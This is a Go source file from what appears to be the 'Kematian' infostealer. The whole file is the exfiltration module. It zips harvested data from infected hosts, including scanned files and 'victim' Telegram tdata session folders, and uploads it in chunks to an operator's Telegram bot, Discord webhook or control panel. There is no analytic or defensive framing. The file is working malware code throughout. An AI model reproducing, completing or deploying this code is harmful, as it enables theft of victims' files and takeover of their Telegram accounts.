package main

import (
	"fmt"
	"log"
	"strings"

	"recovery/recovery"
)

func uploadAllHarvest(cfg uploadConfig, hostname string, p *harvestPayload, quiet bool) error {
	arch := p.Arch
	if arch == "" {
		arch = "mac"
	}
	baseFilename := fmt.Sprintf("%s-kematian-%s", sanitizeFilename(hostname), sanitizeFilename(arch))
	maxChunk := cfg.maxChunkBytes()

	if err := uploadPrimaryHarvest(cfg, baseFilename, p, maxChunk, quiet); err != nil {
		return err
	}

	uploadDelay(cfg)

	if !quiet {
		log.Printf("[kematian] primary upload complete, starting scanned files upload")
	}

	if err := uploadScannedFiles(cfg, baseFilename, p, maxChunk, quiet); err != nil {
		return err
	}

	uploadDelay(cfg)

	if !quiet {
		log.Printf("[kematian] scanned files upload complete, starting telegram tdata upload")
	}

	return uploadVictimTelegram(cfg, baseFilename, p, quiet)
}

func uploadPrimaryHarvest(cfg uploadConfig, baseFilename string, p *harvestPayload, maxChunk int, quiet bool) error {
	chunks, err := buildPrimaryZipChunks(p, maxChunk)
	if err != nil {
		return err
	}
	return uploadZipChunks(cfg, baseFilename, "Kematian harvest", harvestSummary(p), chunks, "harvest", quiet)
}

func uploadScannedFiles(cfg uploadConfig, baseFilename string, p *harvestPayload, maxChunk int, quiet bool) error {
	fileCount := 0
	if p != nil && p.Result != nil {
		for _, f := range p.Result.Files {
			if !isEnvScannedFile(f) {
				fileCount++
			}
		}
	}
	if fileCount == 0 {
		if !quiet {
			log.Printf("[kematian] no scanned files to upload")
		}
		return nil
	}

	chunks, skippedLarge, err := buildScannedFilesZipChunks(p, cfg.maxScannedFileBytes(), maxChunk)
	if err != nil {
		return fmt.Errorf("build scanned files zip: %w", err)
	}
	if len(chunks) == 0 {
		if !quiet && skippedLarge > 0 {
			log.Printf("[kematian] no uploadable scanned files (%d too large)", skippedLarge)
		}
		return nil
	}

	filesBase := baseFilename + "-files"
	return uploadZipChunks(cfg, filesBase, "Kematian files", scannedFilesSummary(fileCount, skippedLarge), chunks, "files", quiet)
}

func uploadVictimTelegram(cfg uploadConfig, baseFilename string, p *harvestPayload, quiet bool) error {
	if p == nil || p.Result == nil || len(p.Result.Telegram) == 0 {
		return nil
	}

	uploaded := 0
	for _, session := range p.Result.Telegram {
		if session.Path == "" {
			continue
		}
		zipData, err := recovery.ZipTelegram(session.Path)
		if err != nil || len(zipData) == 0 {
			if !quiet {
				log.Printf("[kematian] skip telegram session %s: %v", session.Account, err)
			}
			continue
		}

		filename := fmt.Sprintf("%s-telegram-%s.zip", baseFilename, sanitizeFilename(session.Account))
		caption := fmt.Sprintf("Telegram tdata — %s\nAccount: %s\nFiles: %d | Size: %d bytes",
			baseFilename, session.Account, session.Files, session.Size)

		if !quiet {
			log.Printf("[kematian] uploading victim telegram tdata %s (%d bytes)", filename, len(zipData))
		}

		if err := uploadSingleFile(cfg, "Kematian Telegram tdata", caption, filename, zipData, uploadFileContext{
			Phase: "telegram",
		}); err != nil {
			return fmt.Errorf("upload telegram tdata %s: %w", session.Account, err)
		}
		uploaded++
		uploadDelay(cfg)
	}

	if !quiet && uploaded > 0 {
		log.Printf("[kematian] uploaded %d telegram tdata archive(s)", uploaded)
	}
	return nil
}

func uploadZipChunks(cfg uploadConfig, baseFilename, title, summary string, chunks [][]byte, phaseLabel string, quiet bool) error {
	if len(chunks) == 0 {
		return nil
	}

	if !quiet {
		dests := uploadDestLabel(cfg)
		log.Printf("[kematian] uploading %s zip (%d part(s)) via %s", phaseLabel, len(chunks), dests)
	}

	for i, zipData := range chunks {
		filename := baseFilename + ".zip"
		if len(chunks) > 1 {
			filename = fmt.Sprintf("%s-part%d.zip", baseFilename, i+1)
		}

		partSummary := summary
		if len(chunks) > 1 {
			partSummary += fmt.Sprintf("\n\nPart %d/%d (%d bytes)", i+1, len(chunks), len(zipData))
		}

		if !quiet {
			log.Printf("[kematian] uploading %s (%d bytes)", filename, len(zipData))
		}

		if err := uploadSingleFile(cfg, title, partSummary, filename, zipData, uploadFileContext{
			Phase:     phaseLabel,
			PartNum:   i + 1,
			PartTotal: len(chunks),
		}); err != nil {
			return fmt.Errorf("upload %s: %w", filename, err)
		}
		uploadDelay(cfg)
	}
	return nil
}

type uploadFileContext struct {
	Phase     string
	PartNum   int
	PartTotal int
}

func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []byte, ctx uploadFileContext) error {
	var errs []string

	if cfg.useTelegram() {
		caption := title
		if summary != "" {
			caption += "\n\n" + summary
		}
		if err := sendTelegramDocument(cfg.TelegramBotToken, cfg.TelegramChatID, caption, filename, data); err != nil {
			errs = append(errs, "telegram: "+err.Error())
		}
	}

	if cfg.useDiscord() {
		if err := sendDiscordWebhook(cfg.DiscordWebhook, title, summary, data, filename); err != nil {
			errs = append(errs, "discord: "+err.Error())
		}
	}

	if cfg.usePanel() {
		meta := panelUploadMeta{
			Hostname:  cfg.Hostname,
			OS:        cfg.OS,
			Arch:      cfg.Arch,
			Phase:     ctx.Phase,
			PartNum:   ctx.PartNum,
			PartTotal: ctx.PartTotal,
		}
		if err := sendPanelUpload(cfg.PanelURL, cfg.PanelAPIKey, title, summary, filename, data, meta); err != nil {
			errs = append(errs, "panel: "+err.Error())
		}
	}

	if len(errs) == 0 {
		return nil
	}
	if len(errs) == 1 {
		return fmt.Errorf("%s", errs[0])
	}
	return fmt.Errorf("%s", joinErrors(errs))
}

func uploadDelay(cfg uploadConfig) {
	if cfg.useDiscord() {
		discordUploadDelay()
	}
	if cfg.useTelegram() {
		telegramUploadDelay()
	}
}

func uploadDestLabel(cfg uploadConfig) string {
	var parts []string
	if cfg.usePanel() {
		parts = append(parts, "panel")
	}
	if cfg.useTelegram() {
		parts = append(parts, "telegram")
	}
	if cfg.useDiscord() {
		parts = append(parts, "discord")
	}
	if len(parts) == 0 {
		return "none"
	}
	return strings.Join(parts, "+")
}

func joinErrors(errs []string) string {
	out := ""
	for i, e := range errs {
		if i > 0 {
			out += "; "
		}
		out += e
	}
	return out
}